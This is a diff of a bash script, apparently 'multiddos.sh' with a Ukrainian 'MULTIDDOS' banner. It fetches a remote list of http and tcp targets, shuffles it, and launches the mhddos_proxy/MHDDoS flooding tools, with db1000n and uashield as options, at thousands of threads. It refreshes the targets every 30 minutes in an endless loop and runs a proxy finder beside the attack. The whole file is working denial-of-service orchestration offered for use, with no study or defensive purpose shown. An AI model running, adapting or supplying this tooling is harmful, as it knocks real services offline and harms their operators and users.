@@ -5,7 +5,7 @@ clear && echo -e "Loading...\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
-rm -rf ~/multidd; mkdir ~/multidd; cd ~/multidd #delete old folder; create new and cd inside it
+rm -rf ~/multidd; mkdir ~/multidd; cd ~/multidd #delete old folder; create new and cd inside
 
 typing_on_screen (){
     tput setaf 2 &>/dev/null # green
@@ -24,67 +24,48 @@ if [[ $docker_mode != "true" ]]; then
     uashield="off"
     vnstat="off"
     proxy_finder="on"
-    export uvloop="on"
 fi
 
-if [[ $t_set_manual != "on" ]]; then
-    export threads="-t 5000"
-fi
-
-if [[ $t_proxy_manual != "on" ]]; then
-    export proxy_threads="2000"
-fi
+if [[ $t_set_manual != "on" ]]; then export threads="-t 5000"; fi # default threads if not set in cmd
+if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # same for proxy_threads
 
 ### prepare target files (main and secondary)
 prepare_targets_and_banner () {
 export targets_curl="/var/tmp/curl.uaripper"
-export targets_line_by_line="/var/tmp/line_by_line.uaripper"
 export targets_uniq="/var/tmp/uniq.uaripper"
 export targets_lite="/var/tmp/lite.uaripper"
-export t1="/var/tmp/xaa.uaripper"
-export t2="/var/tmp/xab.uaripper"
 rm -f /var/tmp/*uaripper #remove previous copies
 
-# read targets from github and put them in file $targets_curl. Commented and empty lines excluded.
+# read targets from github, exclude comments and empty lines, put valid addresses on new line
 echo "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets)" | while read LINE; do
     if [[ "$LINE" != "#"* ]] && [ "$LINE" != "" ] ; then
-        echo $LINE >> $targets_curl
-    fi
-done
-
-# put all valid addresses on a new line
-for i in $(cat $targets_curl ); do
-    if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
-        echo $i >> $targets_line_by_line
+        for i in $LINE; do
+            if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
+                echo $i >> $targets_curl
+            fi
+        done
     fi
 done
 
 # find only uniq targets, randomize order and save them in $targets_uniq
-cat $targets_line_by_line | sort | uniq | sort -R > $targets_uniq
-
-#split targets in N files
-cd /var/tmp/
-split -n l/2 --additional-suffix=.uaripper $targets_uniq
-cd -
+cat $targets_curl | sort | uniq | sort -R > $targets_uniq
 
 # Print greetings and number of targets
 clear
-toilet -t --metal "Український" && sleep 0.1
-toilet -t --metal "   жнець" && sleep 0.1
-toilet -t --metal " MULTIDDOS" && sleep 0.1
-typing_on_screen 'Шукаю завдання...'
-sleep 0.5
-echo -e "\n\nTotal targets found:" "\x1b[32m $(cat $targets_line_by_line | wc -l)\x1b[m" && sleep 0.1
+toilet -t --metal "Український"
+toilet -t --metal "   жнець"
+toilet -t --metal " MULTIDDOS"
+typing_on_screen 'Шукаю завдання...' ; sleep 0.5
+echo -e "\n\nTotal targets found:" "\x1b[32m $(cat $targets_curl | wc -l)\x1b[m" && sleep 0.1
 echo -e "Uniq targets:" "\x1b[32m $(cat $targets_uniq | wc -l)\x1b[m" && sleep 0.1
-echo -e "\nЗавантаження..."
-sleep 2
+echo -e "\nЗавантаження..."; sleep 2
 clear
 }
 export -f prepare_targets_and_banner
 
 launch () {
 # kill previous sessions or processes in case they still in memory
-tmux kill-session -t multiddos > /dev/null 2>&1
+tmux kill-session -t multidd > /dev/null 2>&1
 sudo pkill node > /dev/null 2>&1
 sudo pkill shield > /dev/null 2>&1
 # tmux mouse support
@@ -125,29 +106,12 @@ if [[ $proxy_finder == "on" ]]; then
     sleep 0.2
     tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
 fi
-
 tmux attach-session -t multidd
-# tmux a
-}
-
-usage () {
-cat << EOF
-usage: bash multiddos.sh [+d|+u|-t|+m|-h]
-                    -g | --gotop            - disable gotop
-                    -p | --proxy-threads    - threads for proxy finder
-                    -p0| --no-proxy-finder  - disable proxy finder
-                    +d | --db1000n          - enable db1000n
-                    +u | --uashield         - enable uashield
-                    +v | --vnstat           - enable vnstat -l (traffic stat)
-                    -t | --threads          - threads
-                    -h | --help             - brings up this menu
-EOF
-exit
 }
 
 if [[ "$1" = ""  ]]; then launch; fi
 
-args_to_pass=""
+#args_to_pass=""
 while [ "$1" != "" ]; do
     case $1 in
         +d | --db1000n )   db1000n="on"; shift ;;
@@ -157,14 +121,11 @@ while [ "$1" != "" ]; do
         -p0| --no-proxy-finder ) export proxy_finder="off"; shift ;;
         --lite ) export lite="on"; export proxy_threads=1000; shift ;;
         -p | --proxy-threads ) export proxy_threads="$2"; shift 2 ;;
-        --no-uvloop ) export uvloop="off"; shift ;;
-        -h | --help )    usage;   exit ;;
-        *   ) export args_to_pass+=" $1"; shift 1; echo $args_to_pass && echo " v13" && sleep 1 ;;
+        *   ) export args_to_pass+=" $1"; shift 1 ;;
     esac
 done
 
 prepare_targets_and_banner
-# clear
 
 # create small separate script to re-launch only this part of code and not the whole thing
 cat > auto_bash.sh << 'EOF'
@@ -180,20 +141,17 @@ cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 git clone https://github.com/MHProDev/MHDDoS.git
 
-if [[ $uvloop == "off" ]]; then
-    pip uninstall -y uvloop
-fi
-
 # Restart and update targets every 30 minutes
 while true; do
-    pkill -f start.py; pkill -f runner.py 
+    pkill -f start.py; pkill -f runner.py
     if [[ $lite == "on" ]]; then
         tail -n 2000 $targets_uniq > $targets_lite
         python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 5000 &
     else
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $methods $args_to_pass &
+        cd /var/tmp/; split -n l/2 --additional-suffix=.uaripper $targets_uniq; cd - #split targets in 2
+        python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xaa.uaripper $methods $args_to_pass &
         sleep 5 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $methods $args_to_pass &
+        python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xab.uaripper $methods $args_to_pass &
     fi
 sleep 30m
 prepare_targets_and_banner
